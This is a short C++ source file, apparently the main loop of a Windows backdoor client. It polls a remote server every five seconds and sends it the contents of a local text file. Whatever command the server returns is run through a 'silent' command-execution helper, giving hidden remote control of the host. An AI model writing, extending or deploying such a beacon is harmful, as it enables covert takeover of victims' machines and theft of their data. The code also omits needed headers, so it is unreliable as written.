#include "connection.hpp"

#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <cstdlib>

#include <windows.h>

#define ACTKNOGLAGEMENT "act"


int main() {
    const std::string command = "cmd.exe /c echo \"Hello, invisible world!\" >> text.txt";
    std::string result;
    std::string received;

    int intervalSeconds = 5;  // Interval for sending requests (in seconds)


    while (true) {     

        std::ifstream file("text.txt");  
        if (!file.is_open()) {            
            // Send request to the server at intervals
            received = sendRequest(ACTKNOGLAGEMENT);
        } else{
            std::stringstream buffer;
            buffer << file.rdbuf();  // Read the entire content of the file into buffer
            std::string send = buffer.str();
            received = sendRequest(send);
        }
        
        if (received != std::string(RECEIVE_FAILED)){
            create_silent_cmd(received);
            std::cout << received <<std::endl;
        }
        
        // Wait for the next interval
        std::this_thread::sleep_for(std::chrono::seconds(intervalSeconds));
    }

    return 0;
}